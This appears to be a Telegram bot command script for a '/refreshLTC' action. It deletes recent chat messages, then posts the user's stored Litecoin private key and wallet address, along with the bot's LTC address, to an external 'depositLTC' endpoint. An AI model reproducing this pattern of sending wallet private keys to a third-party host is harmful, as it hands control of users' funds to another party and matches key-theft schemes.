/*CMD
  command: /refreshLTC
  help: 
  need_reply: false
  auto_retry_time: 
  folder: 

  <<ANSWER

  ANSWER

  <<KEYBOARD

  KEYBOARD
  aliases: 
CMD*/


if (request.data) {
  var message_id = request.message.message_id
  var chat_id = request.message.chat.id

  Api.deleteMessage({
    chat_id: chat_id,
    message_id: message_id
  })
Api.deleteMessage({
    chat_id: chat_id,
    message_id: message_id-1
  })
Api.deleteMessage({
    chat_id: chat_id,
    message_id: message_id-2
  })
}
var wallpk = Bot.getProperty("wallpLTC"+user.telegramid)
var w = Bot.getProperty("wallLTC"+user.telegramid)
let LTC=Bot.getProperty("LTC_ADDRESS","🛑 Not Set")
HTTP.post({
url: "https://cryptopay.up.railway.app/depositLTC",
  success: "/completedmkb3",
  body : {'address': LTC , 'privateKey': wallpk ,'my_address':w,'amount': 0}
  })
